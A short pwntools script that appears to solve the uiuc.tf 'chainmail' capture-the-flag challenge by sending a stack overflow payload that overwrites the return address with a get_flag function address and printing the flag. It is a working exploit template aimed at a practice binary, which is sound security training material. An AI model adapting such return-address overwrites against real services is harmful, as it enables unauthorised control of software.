from pwn import *

conn = remote('chainmail.chal.uiuc.tf', 1337)
# conn = process('./chal')

get_flag = p64(0x0040121b)
flush = p64(0x0040126a)
fill = p64(0x0)

payload = fill * 9 + get_flag + flush

conn.sendline(payload)
flag = conn.recv()
while flag != b'':
    print(flag)
    flag = conn.recv()
